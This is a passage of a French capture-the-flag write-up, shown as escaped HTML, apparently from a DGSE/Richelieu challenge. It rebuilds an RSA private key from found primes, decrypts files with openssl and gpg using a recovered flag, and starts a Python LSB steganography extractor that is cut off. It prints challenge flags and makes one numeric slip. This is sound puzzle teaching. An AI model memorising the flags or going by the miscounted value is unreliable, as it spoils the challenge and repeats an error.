                        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'q&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Code pas du tout optimal, mais fonctionnel :)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 ./find_good_prime.py 
p
 31717798413454838971739311391870214101486054474438584033384974797696836002786889741922328038249283935148167589396475764515984792248325276562635675483085593307632384945480084324354199386711259069590701728377654610059849152461565385315663116675949927841648944186909571007960100266136674008112969369512988507367569334838093403144731951113528040013763615354283491955226704334394856253005551393545293491547587439064269735583121706098798182168292621767902095641352443871167789104818694502605762517497996162527138366803593402358312011933528177646501311411008602369245268966975849244259437732574655956250792264392115994984213
q
 26415754111957012456882978698568998595543408604540679602012008905307229528398419508696699258861541673208334031720118065722015191735056250991124159829757615035331104814626815428071461389740988358621575175288995137250131479702118666935818278843603742157096854979085966659730153703721295913600711482578441198179188796849780101926878867272222747848775311501107737838687624647749187764563156054858429897018261077616060929102880860789449995240869652963349913062375402021334173237153511868665597034141167420444312865576543827395764456254276820652449103574192677537410783040227047254038577626347718324544296319787177388746439
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons maintenant notre $p$ et $q$ qui sont premiers.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsatool.py &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; priv.key &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 3171779841... &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 2641575411...
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
Saving PEM as priv.key
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Avec &lt;code class=&quot;highlighter-rouge&quot;&gt;rsatool.py&lt;/code&gt;nous créons notre clé privée connaissant $p$ et $q$.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-decrypt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--inkey&lt;/span&gt; priv.key &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; motDePasseGPG.txt.enc &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; motDePasseGPG.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;motDePasseGPG.txt
DGSE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Ti,%yei3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;stlh_,5@pIrrMU.^mJC:luYbt1Qe_-Y&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On déchiffre ensuite avec &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 1337  gpg &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; lsb_RGB.png.enc &lt;span class=&quot;nt&quot;&gt;--symmetric&lt;/span&gt; lsb_RGB.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;À ce stade nous n’avons toujours pas utilisé cette commande, étrange…&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; suite_files/ &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DGSE{Ti,%yei3=stlh_,5@pIrrMU.^mJC:luYbt1Qe_-Y}&quot;&lt;/span&gt; suite.zip
Archive:  suite.zip
   skipping: suite.txt               incorrect password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Et non, ce mot de passe ne permet pas de déchiffrer le zip &lt;code class=&quot;highlighter-rouge&quot;&gt;suite.zip&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;gpg&quot;&gt;GPG&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 1337  gpg &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; lsb_RGB.png.enc &lt;span class=&quot;nt&quot;&gt;--symmetric&lt;/span&gt; lsb_RGB.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En regardant la commande, on se rend compte, que nous avons à faire à un chiffrement &lt;code class=&quot;highlighter-rouge&quot;&gt;symetric&lt;/code&gt;. Alors que naturellement, &lt;strong&gt;GPG&lt;/strong&gt; est un système de chiffrement asymétrique avec une notion de clé privée et publique. Pour du symétrique, il ne faut que le mot de passe pour déchiffrer, pas besoin de clé privée.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gpg &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--yes&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--passphrase&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DGSE{Ti,%yei3=stlh_,5@pIrrMU.^mJC:luYbt1Qe_-Y}&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; lsb_RGB.png &lt;span class=&quot;nt&quot;&gt;--decrypt&lt;/span&gt; lsb_RGB.png.enc
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En cherchant un peu, on trouve comment déchiffrer du symétrique issu de GPG. On peut alors utiliser notre mot de passe que nous avions trouvé. Le fichier déchiffré est une autre image de Richelieu encore une fois.&lt;/p&gt;

&lt;p&gt;Le nom est assez explicite pour comprendre que la prochaine étape consiste à extraire des données en &lt;strong&gt;LSB&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;lsb&quot;&gt;LSB&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;In digital steganography, sensitive messages may be concealed by manipulating and storing  information in the least significant bits of an image or a sound file. In the context of an image, if a user were to manipulate the last two bits of a color in a pixel, the value of the color would change at most +/- 3 value places, which is likely to be indistinguishable by the human eye. The user may later recover this information by extracting the  least significant bits of the manipulated pixels to recover the original message. This allows for the storage or transfer of digital information to be kept concealed.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Pour cette étape, nous devons utiliser l’image &lt;code class=&quot;highlighter-rouge&quot;&gt;lsb_RGB.png&lt;/code&gt; afin d’extraire des données de celle-ci. Le LSB utilise la valeur des bits de poids faible des couleurs Rouge, Vert et Bleue. La difficulté du LSB réside dans la bonne sélection des bits de poids faibles. Nous utiliserons la librairie &lt;code class=&quot;highlighter-rouge&quot;&gt;PIL(Python Imaging Library)&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lsb_RGB.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1562&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2424&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# (y,x)
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'RGB'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;180&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut tout d’abord voir que l’on a affaire à un PNG de type &lt;strong&gt;RGB&lt;/strong&gt; (et non &lt;strong&gt;RGBA&lt;/strong&gt;, car pas de valeur alpha). Chaque pixel correspond alors à un tuple de taille 3, par exemple &lt;code class=&quot;highlighter-rouge&quot;&gt;(60, 180, 75)&lt;/code&gt; correspond à la valeur du pixel en position &lt;code class=&quot;highlighter-rouge&quot;&gt;[y=0,x=0]&lt;/code&gt;. La valeur &lt;code class=&quot;highlighter-rouge&quot;&gt;60&lt;/code&gt; correspond à la quantité de rouge (Red) du pixel (valeur maximale de 255), &lt;code class=&quot;highlighter-rouge&quot;&gt;180&lt;/code&gt; est la quantité de vert (Green) et &lt;code class=&quot;highlighter-rouge&quot;&gt;75&lt;/code&gt; la quantité de bleu (Blue).&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zfill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'00111100'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'10110100'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'01001011'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# zfill(8): prefix with &quot;0&quot; to fixing size
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Chacune de ces valeurs est codée sur 8 bits. Par exemple, la valeur &lt;code class=&quot;highlighter-rouge&quot;&gt;63&lt;/code&gt; en base 10, est défini par &lt;code class=&quot;highlighter-rouge&quot;&gt;00111100&lt;/code&gt; en base 2.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;'00111100'&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s1&quot;&gt;'.......0'&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'10110100'&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s1&quot;&gt;'.......0'&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'01001011'&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s1&quot;&gt;'.......1'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pour ce premier pixel, la valeur LSB du RED est &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, celle du GREEN est &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; et celle du BLUE est &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;La difficulté réside maintenant dans le fait de savoir si nous devons utiliser les 3 bits précédents ou simplement le LSB du RED, ou du GREEN, … ou même seulement le LSB du GREEN et BLUE.&lt;/p&gt;

&lt;p&gt;Également, nous devons savoir dans quelle direction parcourir les pixels de notre image, soit ligne par ligne (de gauche à droite) ou en colonnes (haut en bas).&lt;/p&gt;

&lt;p&gt;Après pas mal de tests, on sait qu’il faut utiliser les 3 LSB, le RED, GREEN et BLUE, de plus on doit parcourir les pixels de notre image en colonne, de haut en bas.&lt;/p&gt;

&lt;p&gt;Voici notre extracteur LSB:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;dimX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dimY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;all_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dimX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dimY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zfill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# RED last bit
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zfill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# GREEN last bit
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zfill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# BLUE last bit
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;all_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;tab_all_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tab_all_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Start'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
